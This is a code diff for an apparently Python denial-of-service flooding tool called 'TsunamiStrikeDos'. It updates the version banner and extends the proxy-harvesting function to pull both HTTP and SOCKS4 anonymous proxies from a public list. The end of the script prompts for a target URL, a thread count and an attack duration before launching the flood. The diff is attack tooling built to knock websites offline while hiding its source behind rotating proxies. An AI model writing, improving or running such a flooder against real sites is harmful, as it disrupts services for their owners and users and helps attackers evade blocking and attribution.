@@ -25,7 +25,7 @@ print(f'''
 ⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣏⣛⣛⣉⣛⡛⠋⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⠟⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-                {F.CYAN} TsunamiStrikeDos {F.GREEN}V 3.2.1 {F.RESET}
+                {F.CYAN} TsunamiStrikeDos V {F.GREEN}3.2.5{F.RESET}
 ''')
 
 # -------------------------------------------
@@ -52,17 +52,33 @@ def dataRandom():
 warnings.filterwarnings("ignore", message="Unverified HTTPS request")
 
 def get_http_proxies() -> List[Dict[str, str]]:
-    """Return a dictionary of available proxies using http protocol."""
+    """Return a list of available proxies from both HTTP and SOCKS4."""
+    proxies = []
     try:
+        # Fetch HTTP proxies
         with requests.get(
-            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=1000&country=all",
             verify=False,
-        ) as proxy_list:
-            proxies = [
-                {"http": proxy, "https": proxy}
-                for proxy in proxy_list.text.split("\r\n")
+        ) as proxy_list_http:
+            proxies_http = [
+                {"http": "http://" + proxy, "https": "http://" + proxy}
+                for proxy in proxy_list_http.text.split("\r\n")
                 if proxy != ""
             ]
+            proxies.extend(proxies_http)
+
+        # Fetch SOCKS4 proxies
+        with requests.get(
+            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all",
+            verify=False,
+        ) as proxy_list_socks4:
+            proxies_socks4 = [
+                {"http": "socks4://" + proxy, "https": "socks4://" + proxy}
+                for proxy in proxy_list_socks4.text.split("\r\n")
+                if proxy != ""
+            ]
+            proxies.extend(proxies_socks4)
+
     except Timeout:
         print(f"\n{F.RED}[ !!! ] {F.CYAN}It was not possible to connect to the proxies!{F.RESET}")
         sys.exit(1)
@@ -138,4 +154,3 @@ if __name__ == "__main__":
     duration = int(input(f"{F.CYAN}[?]{F.RESET} attack duration (seconds): {F.GREEN}"))
 
     start_flooding(target_url, num_threads, duration)
-    
